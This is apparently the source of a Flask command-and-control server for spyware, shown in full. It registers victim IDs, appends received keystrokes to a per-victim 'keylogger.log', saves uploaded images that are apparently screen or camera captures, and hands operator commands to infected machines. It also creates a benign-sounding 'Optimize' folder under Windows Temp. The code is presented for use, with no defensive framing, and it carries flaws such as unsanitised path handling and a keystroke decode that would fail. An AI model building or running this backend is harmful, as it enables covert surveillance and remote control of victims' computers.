from flask import Flask, jsonify, request, send_file
import struct
import base64
import json
import os
import sqlite3
from datetime import datetime
from zoneinfo import ZoneInfo
DB = "database.db"
os.makedirs(r"C:\Windows\Temp\Optimize", exist_ok=True)
app = Flask(__name__)
with sqlite3.connect(DB) as conn:
    cursor = conn.cursor()
    cursor.execute("""CREATE TABLE IF NOT EXISTS keys (
        key TEXT UNIQUE NOT NULL,
        created_at TIMESTAMP
        )""")
def recv_exact(content, start, size):
    if len(content) < start + size:
        return None
    return content[start:start + size]
def on_content(content, type_, key):
    if type_ == "img":
        # Read 4-byte size
        size_data = recv_exact(content, 0,4)
        size = struct.unpack("!I", size_data)[0]
        
        image_data = recv_exact(content, 4, size)

        if not image_data:
            return 400
        import os
        num = 0
        file = f"{key}/img/received_{num}.jpg"
        while True:
            if os.path.exists(file):
                num +=1
                file = f"{key}/img/received_{num}.jpg"
            else:
                break
        with open(f"{key}/img/received_{num}.jpg", "wb") as f:
            f.write(image_data)

        # print("Image saved as received.jpg")
    elif type_ == "key":
        data = content

        try:
            text = data.decode("utf-8", errors="ignore")
            key_data = text
            with open(f"{key}/keylogger.log", "a", encoding="utf-8") as file:
                file.write(key_data + "\n")

        except Exception as e:
            print("Error processing key:", e)
            return 400
    return 200
@app.get("/generate-code")
def generate():
    with sqlite3.connect(DB) as conn:
        cursor = conn.cursor()
        key = os.urandom(4).hex()
        print(key)
        cursor.execute("""INSERT INTO keys(
            key,
            created_at
            ) VALUES (?,?)""", (key, datetime.now(ZoneInfo("America/Mexico_city"))))
        conn.commit()
    return key
@app.get(f"/get-commands/<code>")
def get_commands(code):
    if os.path.exists(f"{code}/commands.txt"):
        with open(f"{code}/commands.txt", "r") as file:
            data = file.read()
    else:
        data = []
    payload= {
        "commands": str(data)
    }
    print(payload)
    return json.dumps(payload)
@app.post("/send-content/")
def send():
    data = request.get_json()
    content = data['content']
    key = data['key']
    respons = on_content(content, "key", key)
    response = jsonify({"success": "true"}) if respons == 200 else jsonify({"success": "false"})
    return response
@app.post("/upload")
def upload():
    data = request.get_json()

    content = data['content']   # no str()
    key = data['key']

    image_bytes = base64.b64decode(content)
    respons = on_content(image_bytes, "img", key)

    return jsonify({"success": respons == 200})


@app.post("/update")
def update():
    data = request.get_json()

    key = data['key']
    commands = data['commands']  # no str()

    os.makedirs(key, exist_ok=True)

    with open(f"{key}/commands.txt", "w") as file:
        file.write(json.dumps(commands, indent=2))  # or join if list

    return jsonify({"success": True})
app.run()